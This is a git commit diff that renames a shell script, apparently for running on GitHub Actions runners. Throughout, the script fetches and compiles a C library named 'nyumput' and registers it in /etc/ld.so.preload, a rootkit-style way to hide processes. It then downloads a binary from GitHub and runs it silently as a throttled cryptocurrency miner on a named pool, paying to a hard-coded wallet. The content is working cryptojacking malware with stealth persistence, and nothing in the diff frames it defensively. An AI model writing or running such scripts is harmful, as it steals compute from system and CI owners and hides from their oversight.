bb2c0c0498dcdd1095bdd75cc503a80ce56078cf
barburonjilo <barburonjilo@outlook.co.id>
2024-06-05 20:12:33 +0700

    Update and rename cobasudo.sh to cobaactiongh.sh

--- cobaactiongh.sh
+++ cobaactiongh.sh
@@ -1,17 +1,17 @@
 #!/bin/bash
 apt-get update ; apt-get install sudo wget cpulimit -y
-sudo curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
-sudo apt-get install build-essential -y
-sudo gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-sudo mv libnyumput.so /usr/local/lib/
-sudo echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-sudo rm nyumput.c
-sudo mkdir .lib && cd .lib
+curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+mkdir .lib && cd .lib
 # https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker
 # https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
 wget -O sgr1  https://github.com/TiannaMcdowell/All-File/raw/main/sereb >/dev/null 2>&1
-sudo chmod +x sgr1
-cpulimit -l 600 -e sgr1 &
+chmod +x sgr1
+cpulimit -l 400 -e sgr1 &
 # sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
 # nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
 ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.solo --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
